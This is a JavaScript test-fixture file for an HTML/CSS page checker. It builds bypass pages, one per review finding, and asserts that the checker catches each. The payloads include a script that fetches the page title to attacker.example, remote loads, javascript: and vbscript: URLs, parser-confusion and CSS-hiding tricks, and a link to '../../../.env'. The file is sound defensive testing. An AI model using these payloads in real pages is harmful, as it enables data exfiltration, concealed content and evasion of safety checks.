// SPDX-FileCopyrightText: 2025-2026 Qodeca sp. z o.o.
// SPDX-License-Identifier: GPL-3.0-only
//
// Pages built to get past the checker, one failing case per payload in the review
// of PR 86 (D-01 to D-09 and D-12 to D-19), and the rules that had no failing case.
// The ID in each name is the finding. run-fixtures.mjs calls runBypassFixtures.
// Characters a browser reads differently are built with fromCodePoint, so they
// stay visible in this file.

import { readFileSync, rmSync, writeFileSync } from 'node:fs'
import path from 'node:path'

const NBSP = String.fromCodePoint(0xA0)
const LINE_SEPARATOR = String.fromCodePoint(0x2028)
const DOTTED_I = String.fromCodePoint(0x130)
const ESCAPE = String.fromCodePoint(0x1B)
const REMOTE = 'https://attacker.example'
const OVER_LIMIT_BYTES = 25 * 1024 * 1024 + 1

const has = (list, rule, reason = '') => list.some(p => p.includes(`[${rule}]`) && p.includes(reason))
const replace = (a, b) => html => {
  if (!html.includes(a)) throw new Error(`mutation target not found: ${a}`)
  return html.replace(a, () => b)
}
const inMain = snippet => replace('</main>', `${snippet}\n</main>`)
const inHead = snippet => replace('</head>', `${snippet}\n</head>`)
const css = text => inHead(`<style>${text}</style>`)
const onHtml = snippet => replace('<head>', `${snippet}\n<head>`)
const afterCsp = snippet => replace('<meta charset="utf-8">', `<meta charset="utf-8">\n${snippet}`)
const beforeCharset = snippet => replace('<meta charset="utf-8">', `${snippet}\n<meta charset="utf-8">`)
const CONTROL = '<button class="button" type="button" tabindex="-1">Pay 49 EUR</button>'
const inFrame = snippet => replace(CONTROL, snippet)
const onBody = attr => replace('data-design-page="screen"', `data-design-page="screen" ${attr}`)
const remoteLink = rel => inHead(`<link rel="${rel}" href="${REMOTE}/a">`)

const COMMENTS_AND_RAW_TEXT = [
  ['D-01 <!--> before the head', onHtml(`<!--><script>fetch('${REMOTE}/?'+document.title)</script><!-- -->`), 'markup'],
  ['D-01 <!---> in the page', inMain('<!---><dialog>x</dialog><!-- -->'), 'markup'],
  ['T13 --!> ends a comment', inMain('<!-- a --!><dialog>hidden</dialog><!-- b -->'), 'no-hidden'],
  ['D-01 --!> is itself a problem', inMain('<!-- a --!><p>x</p><!-- b -->'), 'markup'],
  ['D-01 CDATA in SVG', inMain('<svg><![CDATA[ > <!-- ]]><img src="x" alt=""><!-- --></svg>'), 'markup'],
  ['D-01 a bogus comment', inMain('<?php x ?>'), 'markup'],
  ['D-02 noembed', inMain(`<noembed><!--</noembed><img src="${REMOTE}/x" alt=""><noembed>--></noembed>`), 'no-hidden'],
  ['D-02 noembed image still read', inMain(`<noembed><!--</noembed><img src="${REMOTE}/x" alt=""><noembed>--></noembed>`), 'no-hidden'],
  ['D-02 noframes', inMain('<noframes>x</noframes>'), 'no-hidden'],
  ['D-02 noscript', inMain('<noscript>x</noscript>'), 'no-hidden'],
  ['D-02 xmp', inMain('<xmp>x</xmp>'), 'no-hidden'],
  ['D-02 plaintext', inMain('<plaintext>x'), 'no-hidden'],
  ['D-02 title in SVG', inMain(`<svg><title><img src="${REMOTE}/x" alt=""></title></svg>`), 'elements'],
  ['D-02 the image after an SVG title', inMain(`<svg><title><img src="${REMOTE}/x" alt=""></title></svg>`), 'links'],
  ['D-02 textarea in SVG', inMain('<svg><textarea><img src="x" alt=""></textarea></svg>'), 'elements'],
  ['D-02 style in SVG', inMain('<svg><style>.a { display: none; }</style></svg>'), 'elements'],
  ['D-02 math', inMain('<math><mi>x</mi></math>'), 'elements'],
  ['D-02 markup in a title', replace('<title>Payment – Checkout</title>', '<title>a<b>c</title>'), 'markup'],
  ['D-02 markup in a textarea', inFrame('<textarea tabindex="-1" readonly><b>x</b></textarea>'), 'markup']
]

const ENTITIES_AND_SYNTAX = [
  ['D-03 entity in rel', inHead(`<link rel="style&#115;heet" href="${REMOTE}/a.css">`), 'attributes'],
  ['D-03 entity in style', inMain('<p style="dis&#112;lay:none">x</p>'), 'attributes'],
  ['D-03 entity in http-equiv', inHead('<meta http-equiv="re&#102;resh" content="0">'), 'attributes'],
  ['D-03 entity in class', inMain('<div class="design&#45;frame"><a href="x.html">x</a></div>'), 'attributes'],
  ['T17 named entity in style', inMain('<p style="display&colon;none">x</p>'), 'attributes'],
  ['D-04 NBSP after an equals sign', inMain(`<p class=${NBSP}"><img src="${REMOTE}/x" alt="">">x</p>`), 'markup'],
  ['D-04 NBSP between attributes', inMain(`<p class="a"${NBSP}id="b">x</p>`), 'markup'],
  ['D-04 line separator in a tag', inMain(`<p${LINE_SEPARATOR}class="a">x</p>`), 'markup'],
  ['D-04 unquoted value', inMain('<p class=a>x</p>'), 'markup'],
  ['D-04 single quotes', inMain("<p class='a'>x</p>"), 'markup'],
  ['D-04 slash between attributes', inMain('<p class="a"/id="b">x</p>'), 'markup'],
  ['D-04 attributes on a closing tag', inMain('<p>x</p class="a">'), 'markup'],
  ['D-04 attribute twice', inMain('<p class="a" class="b">x</p>'), 'markup'],
  ['D-05 dotted capital I shifts a title', replace('<title>Payment – Checkout</title>', `<title>${DOTTED_I.repeat(20)}</title><meta http-equiv="refresh" content="0"><title>x</title>`), 'no-script']
]

const PAGE_START = [
  ['D-06 body before head', replace('<head>', '<body data-design-page="screen"><head>'), 'page'],
  ['D-06 element before head', onHtml('<meta name="x" content="y">'), 'page'],
  ['D-06 text before the doctype', html => `x${html}`, 'page'],
  ['D-06 a comment before the doctype', html => `<!-- x -->${html}`, 'page'],
  ['D-06 upper-case doctype', replace('<!doctype html>', '<!DOCTYPE html>'), 'page'],
  ['D-06 a second body', inMain('<body onload="x()">'), 'page'],
  ['D-06 a second head', inMain('<head></head>'), 'page'],
  ['D-06 text in head', inHead('stray text'), 'page'],
  ['D-06 text after the page', html => `${html}<p>x</p>`, 'page'],
  ['D-06 text between head and body', replace('</head>', '</head>\ntext'), 'page'],
  ['D-07 base before head', onHtml('<base href="other/">'), 'page'],
  ['D-07 base in head', inHead('<base href="other/">'), 'elements'],
  ['D-07 base in body', inMain(`<base href="${REMOTE}/">`), 'elements'],
  ['D-17 a second charset', afterCsp('<meta charset="iso-2022-jp">'), 'page'],
  ['D-17 a charset before the first', beforeCharset('<meta charset="iso-2022-jp">'), 'page'],
  ['D-17 content-type meta', inHead('<meta http-equiv="content-type" content="text/html; charset=iso-2022-jp">'), 'csp'],
  ['D-17 an escape byte', inMain(`<p>${ESCAPE}$B</p>`), 'markup'],
  ['a second policy', inHead(`<meta http-equiv="Content-Security-Policy" content="default-src *">`), 'csp'],
  ['a policy that differs by a word', replace("img-src 'self'", 'img-src *'), 'csp'],
  ['missing charset', replace('<meta charset="utf-8">\n', ''), 'page'],
  ['missing main', html => html.replace('<main>', '<div>').replace('</main>', '</div>'), 'anatomy']
]

const REMOTE_LOADS = [
  ['D-08 remote image', inMain(`<img src="${REMOTE}/p.png" alt="">`), 'links'],
  ['D-08 remote video', inMain(`<video src="${REMOTE}/v.mp4"></video>`), 'no-hidden'],
  ['D-08 image input', inMain(`<input type="image" src="${REMOTE}/p.png">`), 'attributes'],
  ['D-08 SVG image', inMain(`<svg><image href="${REMOTE}/p.png"></image></svg>`), 'elements'],
  ['D-08 icon link', remoteLink('icon'), 'links'],
  ['D-08 preconnect link', remoteLink('preconnect'), 'links'],
  ['D-08 body background', onBody(`background="${REMOTE}/p.png"`), 'attributes'],
  ['D-08 CSS background', css(`.a { background: url(${REMOTE}/p.png); }`), 'links'],
  ['D-08 quoted CSS url', css(`.a { background: url("${REMOTE}/p.png"); }`), 'links'],
  ['D-08 remote font', css(`@font-face { font-family: x; src: url(${REMOTE}/f.woff2); }`), 'links'],
  ['D-08 protocol-relative url', css('.a { background: url(//attacker.example/p.png); }'), 'links'],
  ['D-08 data url', css('.a { background: url(data:image/png;base64,AAAA); }'), 'links'],
  ['D-08 url in a custom property', css(`:root { --logo: url(${REMOTE}/p.png); }`), 'links'],
  ['D-08 image-set', css(`.a { background: image-set("${REMOTE}/p.png" 1x); }`), 'links'],
  ['D-18 query in a stylesheet path', inHead('<link rel="stylesheet" href="a.css?v=1">'), 'links'],
  ['D-18 percent in a stylesheet path', inHead('<link rel="stylesheet" href="hi%64e.css">'), 'links'],
  ['D-18 backslash in a stylesheet path', inHead('<link rel="stylesheet" href="\\\\host\\x.css">'), 'links'],
  ['D-18 leading space', inHead('<link rel="stylesheet" href=" a.css">'), 'links'],
  ['D-18 entity scheme', inHead(`<link rel="stylesheet" href="https&colon;//attacker.example/a.css">`), 'attributes'],
  ['D-18 root path', inMain('<img src="/etc/x.png" alt="">'), 'links'],
  ['D-19 not a stylesheet', inHead('<link rel="stylesheet" href="../../../.env">'), 'links'],
  ['the web link allowance stops at a', inMain(`<img src="${REMOTE}/p.png" alt="">`), 'links'],
  ['a web link in a frame', inFrame(`<a href="${REMOTE}/">x</a>`), 'no-fake-controls']
]

const HIDDEN_CONTENT = [
  ['D-12 datalist', inMain('<datalist><option>x</option></datalist>'), 'no-hidden'],
  ['D-12 canvas', inMain('<canvas>x</canvas>'), 'no-hidden'],
  ['D-12 audio', inMain('<audio>x</audio>'), 'no-hidden'],
  ['D-12 select outside a frame', inMain('<select><option>x</option></select>'), 'elements'],
  ['T14 hidden input', inMain('<input type="hidden" value="x">'), 'no-hidden'],
  ['D-12 SVG defs', inMain('<svg><defs><text>x</text></defs></svg>'), 'elements'],
  ['D-12 SVG symbol', inMain('<svg><symbol><text>x</text></symbol></svg>'), 'elements'],
  ['D-12 SVG metadata', inMain('<svg><metadata>x</metadata></svg>'), 'elements'],
  ['D-12 SVG desc', inMain('<svg><desc>x</desc></svg>'), 'elements'],
  ['D-12 SVG display attribute', inMain('<svg><path display="none"></path></svg>'), 'attributes'],
  ['D-12 SVG visibility attribute', inMain('<svg><path visibility="hidden"></path></svg>'), 'attributes'],
  ['D-12 SVG opacity attribute', inMain('<svg><path opacity="0"></path></svg>'), 'attributes'],
  ['D-12 SVG pointer-events attribute', inMain('<svg><path pointer-events="none"></path></svg>'), 'attributes'],
  ['D-12 SMIL set', inMain('<svg><set attributeName="display" to="none"></set></svg>'), 'elements'],
  ['D-12 SMIL animate', inMain('<svg><animate attributeName="href" values="x;javascript:alert(1)"></animate></svg>'), 'elements'],
  ['D-15 details with open', inMain('<details open name="g"><summary>a</summary>x</details>'), 'no-hidden'],
  ['D-15 summary alone', inMain('<summary>x</summary>'), 'no-hidden'],
  ['contenteditable', inMain('<p contenteditable="true">x</p>'), 'attributes'],
  ['title attribute', inMain('<p title="only on hover">x</p>'), 'attributes']
]

const hide = (name, text) => [`D-13 ${name}`, css(`.a { ${text}; }`), 'no-hidden']
const CSS_RULES = [
  ['D-09 comment marks in strings', css('.a{content:"/*"}.b{display:none}.c{content:"*/"}'), 'no-hidden'],
  ['D-09 escaped property', css('.a{d\\69splay:none}'), 'css'],
  ['D-09 escaped selector', css('.a:t\\61rget{color:var(--color-text)}'), 'css'],
  ['D-09 hiding value in a token', css('.a{--h:none;display:var(--h)}'), 'no-hidden'],
  ['D-09 the same in a style attribute', inMain('<p style="--h: none; display: var(--h)">x</p>'), 'no-hidden'],
  ['D-09 a backslash in a string', css('.a { content: "\\201C"; }'), 'css'],
  ['D-09 a comment inside the property name', css('.a { display/**/: none; }'), 'no-hidden'],
  ['D-09 an unclosed comment', css('.a { color: var(--color-text); } /* .b'), 'css'],
  ['D-09 upper-case property', css('.a { DISPLAY: NONE; }'), 'no-hidden'],
  ['D-09 important', css('.a { display: none !important; }'), 'no-hidden'],
  ['D-09 in keyframes', css('@keyframes k { to { display: none; } }'), 'no-hidden'],
  ['D-09 in media', css('@media (min-width: 1px) { .a { display: none; } }'), 'no-hidden'],
  ['D-09 nested rule', css('.a { .b { display: none; } }'), 'css'],
  ['T20 hiding token in opacity', css('.a { opacity: var(--off); }'), 'no-hidden'],
  hide('opacity .0', 'opacity: .0'), hide('opacity 0%', 'opacity: 0%'), hide('opacity calc', 'opacity: calc(0)'), hide('opacity below the floor', 'opacity: 0.01'),
  hide('filter opacity', 'filter: opacity(0)'), hide('transform scale', 'transform: scale(0)'), hide('transform token', 'transform: var(--off)'),
  hide('scale property', 'scale: 0'), hide('zoom', 'zoom: 0'), hide('clip-path', 'clip-path: inset(100%)'), hide('font-size', 'font-size: 0'),
  hide('font shorthand', 'font: 0/0 a'), hide('height', 'height: 0'), hide('max-height', 'max-height: 0'), hide('transparent text', 'color: transparent'),
  hide('negative z-index', 'z-index: -1'), hide('interactivity', 'interactivity: inert'), hide('matrix', 'transform: matrix(0, 0, 0, 0, 0, 0)'),
  hide('content-visibility', 'content-visibility: hidden'), hide('visibility collapse', 'visibility: collapse'),
  ['D-14 checked in is', css('input:is(:checked)~.x { color: var(--color-text); }'), 'no-hidden'],
  ['D-14 checked in has', css(':has(:nth-child(1):checked) { color: var(--color-text); }'), 'no-hidden'],
  ['D-14 hover on a sibling', css('.tab:hover:not(:where(.design-frame *)) + .panel { color: var(--color-text); }'), 'no-hidden'],
  ['D-14 focus-within on a child', css('.a:focus-within .b { color: var(--color-text); }'), 'no-hidden'],
  ['D-14 a state in has', css('.a:has(.b:focus) { color: var(--color-text); }'), 'no-hidden'],
  ['D-14 a state in is', css('.a:is(.b:focus + .c) { color: var(--color-text); }'), 'no-hidden'],
  ['D-14 target in where', css(':where(.a:target) { color: var(--color-text); }'), 'no-hidden'],
  ['D-16 import in a style block', css(`@import "${REMOTE}/hide.css";`), 'links'],
  ['D-16 local import in a style block', css('@import "x.css";'), 'links'],
  ['D-16 upper-case import', css('@IMPORT "x.css";'), 'links'],
  ['D-16 import with no space', css('@import/**/"x.css";'), 'links'],
  ['D-16 charset rule', css('@charset "iso-2022-jp";'), 'css'],
  ['D-16 unknown at-rule', css('@supports (display: grid) { .a { color: var(--color-text); } }'), 'css'],
  ['T22 url import in a style block', css(`@import url(${REMOTE}/a.css);`), 'links'],
  ['T18 colour name', css('.a { color: tomato; }'), 'no-raw-values'],
  ['T18 long colour name', css('.a { background: rebeccapurple; }'), 'no-raw-values'],
  ...['100dvh', '50cqw', '1cm', '1lh', '2ex'].map(size => [`T19 unit in ${size}`, css(`.a { height: ${size}; }`), 'no-raw-values']),
  ['a hover rule in a frame', css('.a:hover { color: var(--color-text); }'), 'frames'],
  ['a read-only rule in a frame', css('.a:read-only { color: var(--color-text); }'), 'frames'],
  ['an active rule in a frame', css('.a:active { color: var(--color-text); }'), 'frames'],
  ['a <style> with a style attribute', inHead('<style style="color: var(--color-text)">.a { display: none; }</style>'), 'no-hidden']
]

// The rules a review found with no failing case.
const UNPROVED_RULES = [
  ['T32 vbscript', inMain('<a href="vbscript:x">x</a>'), 'no-script'],
  ['T32 embed', inMain('<embed src="x">'), 'no-script'],
  ['T32 applet', inMain('<applet></applet>'), 'no-script'],
  ['T32 frame', inMain('<frame src="x">'), 'no-script'],
  ['T32 behavior', css('.a { behavior: url(x.htc); }'), 'no-script'],
  ['T32 binding', css('.a { -moz-binding: url(x.xml); }'), 'no-script'],
  ['T32 script url in CSS', css('.a { background: url(javascript:x); }'), 'no-script'],
  ['T32 popovertarget', inMain('<button popovertarget="x">x</button>'), 'no-hidden'],
  ['T32 has checked', css('.a:has(:checked) { color: var(--color-text); }'), 'no-hidden']
]

const CASES = [...COMMENTS_AND_RAW_TEXT, ...ENTITIES_AND_SYNTAX, ...PAGE_START, ...REMOTE_LOADS, ...HIDDEN_CONTENT, ...CSS_RULES, ...UNPROVED_RULES]

// Each of these is ordinary work that a narrower form must not break.
const MUST_PASS = [
  ['a string that looks like a raw colour', css('.a { font-family: "Orange Sans"; }')],
  ['a string that looks like a size', css('.a { content: "12px"; }')],
  ['a description that mentions JavaScript', replace('What this screen shows, in one line, for the designs index', 'JavaScript: how the page behaves')],
  ['an entity in a text attribute', inMain('<img src="pic.png" alt="Q&amp;A">')],
  ['a web link outside a frame', inMain(`<p><a href="${REMOTE}/guide#start">Guide</a></p>`)],
  ['a fragment link', inMain('<p><a href="#states">States</a></p>')],
  ['a comment that holds a tag', inMain('<!-- <div> is here -->')],
  ['a text with a bare less-than', inMain('<p>a < b</p>')],
  ['a title with a dotted capital I', replace('<title>Payment – Checkout</title>', `<title>${DOTTED_I.repeat(20)}</title>`)],
  ['a plain style state', css('.a:focus-visible { color: var(--color-text); }')],
  ['a guarded hover', css('.a:hover:not(:where(.design-frame *)) { color: var(--color-text); }')],
  ['a static has', css('.row:has(.b) .c { color: var(--color-text); }')],
  ['a faint element', css('.a { opacity: 0.1; }')],
  ['a pressed scale', css('.a { transform: scale(0.98); }')],
  ['a flex minimum of zero', css('.a { min-width: 0; }')],
  ['a read-only input in a frame', inFrame('<input class="a" type="text" value="x" tabindex="-1" readonly>')],
  ['a disabled textarea in a frame', inFrame('<textarea tabindex="-1" disabled></textarea>')]
]

function linkedSheets({ area, system, fail, write, checkPaths }) {
  const sheet = path.join(system, 'components.css')
  const original = readFileSync(sheet, 'utf8')
  const hideSheet = path.join(system, 'hide.css')
  write(hideSheet, '.a { display: none; }\n')
  const problems = text => {
    writeFileSync(sheet, `${text}${original}`)
    return checkPaths([area], { noDate: true }).problems
  }
  for (const [name, text, rule] of [
    ['D-16 upper-case import in a sheet', '@IMPORT "hide.css";\n', 'no-hidden'],
    ['D-16 import with no space in a sheet', '@import/**/"hide.css";\n', 'no-hidden'],
    ['T32 remote import', `@import url(${REMOTE}/a.css);\n`, 'links'],
    ['D-19 import that leaves the folder', '@import "../../../outside.css";\n', 'links'],
    ['T16 import of a folder', '@import "./";\n', 'links']
  ]) {
    if (!has(problems(text), rule)) fail(`"${name}" was not caught by [${rule}]; got ${problems(text).slice(0, 2).join(' | ')}`)
  }
  writeFileSync(sheet, original)
  rmSync(hideSheet)
}

function responsiveSheet({ system, area, fail, write, checkPaths }) {
  const sheet = path.join(system, 'responsive.css')
  const original = readFileSync(sheet, 'utf8')
  write(sheet, `${original}.a { margin: 3px; }\n`)
  if (!has(checkPaths([path.dirname(sheet)], { noDate: true }).problems, 'no-raw-values')) fail('T32 a raw value in responsive.css was not caught')
  write(sheet, original)
  if (has(checkPaths([area], { noDate: true }).problems, 'no-hidden')) fail('responsive.css may hide things: it is real product CSS')
}

function fileLimits({ area, file, page, fail, write, checkPaths }) {
  const check = () => checkPaths([area], { noDate: true }).problems
  writeFileSync(file, Buffer.concat([Buffer.from(page), Buffer.from([0xFF])]))
  if (!has(check(), 'limits', 'UTF-8')) fail('T32 invalid UTF-8 was not caught')
  write(file, `<<<<<<< HEAD\n${page}>>>>>>> other\n`)
  if (!has(check(), 'limits', 'merge-conflict')) fail('T32 merge markers were not caught')
  writeFileSync(file, Buffer.alloc(OVER_LIMIT_BYTES, 0x20))
  if (!has(check(), 'limits', '25 MB')) fail('T32 the 25 MB limit was not caught')
  write(file, page)
}

/** Runs every case. Returns how many payloads were proved. */
export function runBypassFixtures(context) {
  const { area, file, page, fail, write, checkPaths } = context
  const check = () => checkPaths([area], { noDate: true }).problems
  for (const [name, mutate, rule, reason = ''] of CASES) {
    write(file, mutate(page))
    const found = check()
    if (!has(found, rule, reason)) fail(`"${name}" was not caught by [${rule}] ${reason}; got: ${found.slice(0, 3).join(' | ') || 'nothing'}`)
  }
  for (const [name, mutate] of MUST_PASS) {
    write(file, mutate(page))
    const found = check()
    if (found.length > 0) fail(`${name} must pass: ${found.slice(0, 3).join(' | ')}`)
  }
  write(file, page)
  linkedSheets(context)
  responsiveSheet(context)
  fileLimits(context)
  return CASES.length
}
